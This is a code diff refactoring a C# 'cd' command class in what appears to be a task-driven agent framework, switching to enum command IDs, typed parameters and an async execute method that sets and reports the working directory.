@@ -1,30 +1,30 @@
 ﻿using Agent.Models;
+using Shared;
 using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 
 namespace Agent.Commands
 {
     public class ChangeDirectoryCommand : AgentCommand
     {
-        public override string Name => "cd";
-        public override void InnerExecute(AgentTask task, AgentCommandContext context)
+        public override CommandId Command => CommandId.Cd;
+        public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
         {
-            string path;
-            if(task.SplittedArgs.Length == 0)
-            {
+            string path; 
+
+            if(!task.HasParameter(ParameterId.Path))
                 path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
-            }
             else
-            {
-                path = task.SplittedArgs[0];
-            }
+                path = task.GetParameter<string>(ParameterId.Path);
 
             Directory.SetCurrentDirectory(path);
-            context.Result.Result = Directory.GetCurrentDirectory();
+
+            context.AppendResult(Directory.GetCurrentDirectory());
         }
     }
 }
